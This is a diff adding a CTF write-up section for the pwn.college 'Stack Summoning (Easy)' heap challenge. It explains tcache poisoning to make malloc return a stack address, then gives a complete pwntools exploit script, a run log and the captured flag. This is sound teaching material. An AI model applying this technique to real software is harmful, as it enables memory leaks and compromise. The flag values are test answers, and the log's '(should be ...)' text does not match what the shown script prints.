@@ -6548,3 +6548,244 @@ hacker@dynamic-allocator-misuse~stack-spoofing-hard:/$ python ~/script.py
 You win! Here is your flag:
 pwn.college{UO-knMx2TfsXlZ5xVxHIS2Fcp-x.0FN5MDL4ITM0EzW}
 ```
+
+&nbsp;
+
+## Stack Summoning (Easy)
+
+```
+hacker@dynamic-allocator-misuse~stack-summoning-easy:/$ /challenge/stack-summoning-easy
+###
+### Welcome to /challenge/stack-summoning-easy!
+###
+
+This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
+challenges, you will become familiar with the concept of heap exploitation.
+
+This challenge can manage up to 16 unique allocations.
+
+In this challenge, there is a secret stored at 0x7fff3d654099.
+If you can leak out this secret, you can redeem it for the flag.
+
+
+[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit):
+```
+
+### Binary Analysis
+
+```c title="/challenge/stack-summoning-easy :: main() :: Pseudocode" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  // ...
+  _BYTE v13[64];   // [rsp+C0h]  [rbp-1A0h]
+  _BYTE v14[185];  // [rsp+100h] [rbp-160h]
+  char  v15[23];   // [rsp+1B9h] [rbp-A7h]   <- secret stored here
+  char  s1[136];   // [rsp+1D0h] [rbp-90h]
+  // ...
+
+  for ( i = 0; i <= 15; ++i )
+    v15[i] = rand() % 26 + 97;
+
+  printf("In this challenge, there is a secret stored at %p.\n", v15);
+
+  // stack_free
+  printf("[*] free(%p)\n", v14);
+  free(v14);
+
+  // stack_scanf
+  printf("[*] scanf(\"%%127s\", %p)\n", v13);
+  __isoc99_scanf("%127s", v13);
+
+  // send_flag
+  if ( !memcmp(s1, v15, 0x10u) )
+  {
+    puts("Authorized!");
+    win();
+  }
+}
+```
+
+The secret is a 16-byte random string stored at `v15` on the stack, whose address is printed at startup. The goal is to leak it and pass it to `send_flag`.
+
+The challenge provides `stack_free` which frees `v14` (a stack buffer) and prints its address, and `stack_scanf` which writes 127 bytes into `v13` (another stack buffer). We also have the standard heap `malloc`, `free`, `puts`, and `scanf`.
+
+### The Approach
+
+We cannot read from `secret_addr` directly using `puts` since `puts` only reads from pointers stored in `ptr[]`, and we have no way to put `secret_addr` into `ptr[]` directly. Instead we use tcache poisoning to make `malloc` return `secret_addr`, giving us a pointer in `ptr[]` that we can then `puts` to leak the secret.
+
+The standard tcache poisoning approach works here: allocate two heap chunks, free them, poison the first chunk's `next` to point at `secret_addr`, malloc twice to drain the chain, and `puts` on the second allocation which points at the secret.
+
+The key insight is that the tcache count must be at least 1 when we call the final `malloc` that should return `secret_addr`. When `malloc` pops a chunk, it reads that chunk's `next` field, writes it into `entries[idx]`, and decrements `counts[idx]`. If count drops to 0, the next `malloc` call bypasses the tcache entirely even if `entries[idx]` points somewhere valid. So we need count=1 going into the malloc that pops the chunk pointing to `secret_addr`, not count=0.
+
+With two heap chunks freed (count=2), the sequence is:
+
+1. `free(b)`, `free(a)` — tcache: `a -> b`, count=2
+2. Poison `a`'s `next` to `secret_addr` — tcache: `a -> secret_addr`, count=2
+3. `malloc` — pops `a`, count=1, `entries = secret_addr`
+4. `malloc` — count=1 so tcache is used, pops `secret_addr`, count=0
+
+Step 4 works because count is still 1 when we call it. If we had only freed one chunk, count would be 0 after step 3 and step 4 would go to the heap.
+
+```
+free(b), free(a)
+
+
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┊  tcache_perthread_struct Void                                        ┊
+┊            ┏━━━━━━━━━━━━━━━━┓                                        ┊
+┊    counts: ┃ count_192: 2   ┃                                        ┊
+┊            ┣━━━━━━━━━━━━━━━━┫                                        ┊
+┊   entries: ┃ entry_192: &A  ┃                                        ┊
+┊            ┗━━━━━━━━━━━━━━━━┛                                        ┊
+└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
+                              │
+              ╭───────────────╯
+              │
+              v
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┆  tcache_entry A  ┆
+├──────────────────┤
+│    next: &B      │ ────╮
+├──────────────────┤     │
+│    key: Void     │     │
+└──────────────────┘     │
+                         │
+         ╭───────────────╯
+         │
+         v
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┆  tcache_entry B  ┆
+├──────────────────┤
+│    next: NULL    │
+├──────────────────┤
+│    key: Void     │
+└──────────────────┘
+
+
+scanf(0, p64(secret_addr))
+
+
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┊  tcache_perthread_struct Void                                        ┊
+┊            ┏━━━━━━━━━━━━━━━━┓                                        ┊
+┊    counts: ┃ count_192: 2   ┃                                        ┊
+┊            ┣━━━━━━━━━━━━━━━━┫                                        ┊
+┊   entries: ┃ entry_192: &A  ┃                                        ┊
+┊            ┗━━━━━━━━━━━━━━━━┛                                        ┊
+└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
+                              │
+              ╭───────────────╯
+              │
+              v
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┆  tcache_entry A  ┆
+├──────────────────┤
+│ next: secret_addr│ ────╮  (B is now orphaned)
+├──────────────────┤     │
+│    key: Void     │     │
+└──────────────────┘     │
+                         │
+         ╭───────────────╯
+         │
+         v
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┆  STACK (secret_addr)      ┆
+├──────────────────────────┤
+│  secret[:8]               │
+├──────────────────────────┤
+│  secret[8:16]             │
+└──────────────────────────┘
+
+
+malloc(2) → pops A, count=1, entries=secret_addr
+malloc(3) → count=1 so tcache used, pops secret_addr, count=0
+```
+
+### Exploit
+
+```python title="~/script.py" showLineNumbers
+from pwn import *
+
+p = process("/challenge/stack-summoning-easy")
+
+p.recvuntil(b"secret stored at ")
+secret_addr = int(p.recvuntil(b".").strip(b"."), 16)
+print(f"[*] secret at: {hex(secret_addr)}")
+
+p.recvuntil(b"quit): ")
+
+def malloc_leak(idx, size):
+    p.sendline(b"malloc")
+    p.sendline(str(idx).encode())
+    p.sendline(str(size).encode())
+    p.recvuntil(b"= malloc(%d)\n" % size)
+    p.recvuntil(b"allocations[%d] = " % idx)
+    addr = int(p.recvuntil(b"\n").strip(), 16)
+    p.recvuntil(b"quit): ")
+    return addr
+
+def free_chunk(idx):
+    p.sendline(b"free")
+    p.sendline(str(idx).encode())
+    p.recvuntil(b"quit): ")
+
+def scanf_chunk(idx, data):
+    p.sendline(b"scanf")
+    p.sendline(str(idx).encode())
+    p.sendline(data)
+    p.recvuntil(b"quit): ")
+
+def puts_chunk(idx):
+    p.sendline(b"puts")
+    p.sendline(str(idx).encode())
+    p.recvuntil(b"Data: ")
+    data = p.recvuntil(b"\n", drop=True)
+    p.recvuntil(b"quit): ")
+    return data
+
+# allocate two heap chunks of the same bin as secret_addr region
+a = malloc_leak(0, 192)
+b = malloc_leak(1, 192)
+print(f"[*] a: {hex(a)}")
+print(f"[*] b: {hex(b)}")
+
+# free b then a: tcache = a->b, count=2
+free_chunk(1)
+free_chunk(0)
+
+# poison a's next to point at secret_addr
+scanf_chunk(0, p64(secret_addr))
+
+# malloc(2) pops a, count=1, entries=secret_addr
+c = malloc_leak(2, 192)
+print(f"[*] malloc(2) = {hex(c)}")
+
+# malloc(3): count=1 so tcache is used, pops secret_addr
+d = malloc_leak(3, 192)
+print(f"[*] malloc(3) = {hex(d)}")
+
+# puts on ptr[3] which points at secret_addr
+secret = puts_chunk(3).ljust(16, b"\x00")[:16]
+print(f"[*] secret: {secret}")
+
+p.sendline(b"send_flag")
+p.sendline(secret)
+print(p.recvuntil(b"}").decode())
+```
+
+```
+hacker@dynamic-allocator-misuse~stack-summoning-easy:/$ python ~/script.py 
+[+] Starting local process '/challenge/stack-summoning-easy': pid 19395
+[*] secret at: 0x7fff8f23d479
+[*] a: 0x61c7120312c0
+[*] b: 0x61c712031390
+[*] malloc(2) = 0x61c7120312c0 (should be 0x61c7120312c0)
+[*] malloc(3) = 0x7fff8f23d479 (should be 0x7fff8f23d479)
+[*] secret: b'gfpzbhga\x00\x00\x00\x00\x00\x00\x00\x00'
+
+Secret: 
+Authorized!
+You win! Here is your flag:
+pwn.college{oPteTG796tBkHRpITEGLmil50q9.0VN5MDL4ITM0EzW}
+[*] Stopped process '/challenge/stack-summoning-easy' (pid 19395)
+```
